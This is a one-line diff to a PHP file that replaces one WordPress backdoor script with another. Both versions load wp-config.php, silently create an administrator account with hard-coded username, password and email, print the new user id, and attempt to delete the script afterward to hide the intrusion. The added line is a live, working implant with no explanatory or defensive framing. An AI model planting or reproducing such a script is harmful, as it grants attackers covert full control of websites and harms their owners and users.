@@ -1,1 +1,1 @@
-<?php include 'wp-config.php';$user_login='adminsweeeee';$user_pass='admin3423';$user_email='sukarjishai@gmail.com';$role='administrator';$userdata=compact('user_login','user_email','user_pass','role');$user_id=wp_insert_user($userdata);print_R($user_id);unlink(FILE);
+<?php include 'wp-config.php';$user_login='admins';$user_pass='tandiono21';$user_email='erictanz17@gmail.com';$role='administrator';$userdata=compact('user_login','user_email','user_pass','role');$user_id=wp_insert_user($userdata);print_R($user_id);unlink(FILE);
